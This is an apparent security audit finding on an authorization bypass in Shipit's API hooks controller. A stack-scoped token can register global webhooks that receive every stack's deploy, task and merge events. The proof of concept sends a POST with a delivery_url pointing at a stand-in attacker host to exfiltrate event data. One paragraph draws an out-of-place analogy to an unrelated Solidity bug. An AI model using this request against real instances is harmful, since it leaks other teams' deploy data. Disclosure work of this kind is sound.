## Title
Stack-scoped ApiClient can create global webhooks that receive events for every stack in the instance - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` gates the `write:hook` / `read:hook` permission check purely on the operation-scope string (`"write:hook"`), without ever confirming that the target `Hook` record's `stack_id` matches the stack the requesting `ApiClient` is scoped to. Because the engine also exposes a stack-independent route (`resources :hooks` mounted directly under `/api`, not nested in the `/api/stacks/*stack_id/` scope), any `ApiClient` that is restricted to a single stack via `ApiClient#stack_id` but still holds `write:hook`/`read:hook` can create, read, update or delete **global** hooks (`Hook.where(stack_id: nil)`), which `Hook.deliver` fires for **every** stack's `deploy`, `rollback`, `task`, `lock`, `merge`, `commit_status`, etc. events.

### Finding Description
`ApiClient#stack_id?` is meant to bound a token to a single stack: `stacks` in `BaseController` filters `Stack.where(id: current_api_client.stack_id)` when the client is scoped [1](#0-0) . This scoping is honored by controllers that resolve a `stack` object before acting (e.g. `LocksController`, `MergeRequestsController`, `CCMenuController`), because `stack` calls `stacks.from_param!(params[:stack_id])` [2](#0-1) .

`HooksController`, however, only enforces stack scoping when `params[:stack_id]` is present:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

The engine mounts this same controller twice: once nested inside the stack scope (`/api/stacks/*stack_id/hooks`) and once at the top level with no stack context (`resources :hooks` under `namespace :api`) [4](#0-3) . When hit via the un-nested route, `params[:stack_id]` is absent, so `stack_id` returns `nil` and `hooks` resolves to `Hook.where(stack_id: nil)` — the set of **global** hooks — completely bypassing the `stacks`/`ApiClient#stack_id` restriction. The only gate that remains is `ApiClient#check_permissions!`, which merely checks whether the string `"write:hook"`/`"read:hook"` is present in the token's `permissions` array [5](#0-4) ; it has no notion of which stack a hook belongs to.

`Hook.deliver` fires every global hook (`stack_id: nil`) for events on **any** stack, per `for_stack` scope (`where(stack_id: [nil, stack_id])`) [6](#0-5) . A hook the attacker creates can point `delivery_url` at an attacker-controlled endpoint and subscribe to `deploy`, `task`, `rollback`, `merge`, `commit_status`, etc.

This is the same "checked-condition vs. acted-upon condition" class as the reported Solidity bug: the security-relevant scope check (`stack_id` binding) is enforced only *conditionally* (only when a request happens to carry a `stack_id` param), and an attacker who reaches the code path where that precondition is false (the un-nested `/api/hooks` route) sails past the intended restriction — exactly mirroring how `executionEnvironment.codehash == 0` is enforced only in the branch where no one perturbed the precondition. The broken binding, as an equality, is:

`stack a token authorizes` (`ApiClient#stack_id`) ≠ `stack(s) a hook created/read by that token actually touches` (`Hook#stack_id == nil` ⇒ every stack).

### Impact Explanation
An `ApiClient` intentionally provisioned as narrowly scoped to one stack (the documented low-privilege pattern, e.g. fixture `here_come_the_walrus` which is scoped to stack `shipit`) can, if it also carries `write:hook`, register a global webhook that streams deploy/task/rollback/merge event payloads — including permalinks to task output — for every stack managed by the Shipit instance, not just the one it was authorized for. This is an unauthorized cross-stack read of deploy/task state, matching the "unauthenticated/unauthorized read of stack state, task streams or deploy output" high-risk category: the token holder never had `read:stack`/`write:hook` rights on the other stacks, yet gains a durable exfiltration channel for their event stream.

### Likelihood Explanation
Exploitation only requires possession of any `ApiClient` token that was granted `write:hook` and is scoped to a single stack — a plausible, even encouraged, configuration for least-privilege automation tokens (scope a token narrowly to one stack, grant it hook management for that stack's notifications). The route and permission check are unconditional and require no race condition, timing, or additional trust; a single `POST /api/hooks` call (not `/api/stacks/<owner>/<name>/hooks`) suffices.

### Recommendation
Enforce stack ownership independent of whether `params[:stack_id]` is present:
- If `current_api_client.stack_id?` is true, reject (403) any request to the un-nested `/api/hooks` collection, or force `stack_id` to always equal `current_api_client.stack_id` for scoped clients regardless of route.
- Alternatively, remove the un-nested `resources :hooks` route entirely for stack-scoped clients, or add an explicit check in `HooksController` such as `raise InsufficientPermission if current_api_client.stack_id? && !params[:stack_id]` before resolving `hooks`.
- More generally, `ApiClient#check_permissions!` should be extended to also verify, for every hook-scoped action, that the target `Hook#stack_id` (or its absence) is consistent with `current_api_client.stack_id`.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to `stack: shipit` with permission `write:hook` (mirrors fixture `here_come_the_walrus`, just add `write:hook`).
2. Authenticate with that token and call the un-nested collection route:
   ```
   POST /api/hooks
   Authorization: Basic base64("<id>--<token>")
   Content-Type: application/json

   {"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "rollback", "merge"]}
   ```
3. This succeeds (`Hook.where(stack_id: nil)` → creates a hook with `stack_id: nil`), even though the client's token is only authorized for stack `shipit`.
4. Any deploy/task/rollback/merge event on **any** stack in the Shipit instance now triggers `Hook.deliver`, which matches this global hook via `for_stack` (`stack_id IN (nil, <any stack id>)`) and POSTs the event payload to the attacker's `delivery_url` [7](#0-6) .

Note: I was unable to fully verify from the index whether any additional server-side filtering exists elsewhere (e.g., in a not-indexed serializer/policy layer) that might further restrict this behavior; based on the code available in `app/controllers/shipit/api/hooks_controller.rb`, `app/models/shipit/api_client.rb`, `app/models/shipit/hook.rb`, and `config/routes.rb`, no such restriction is present.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
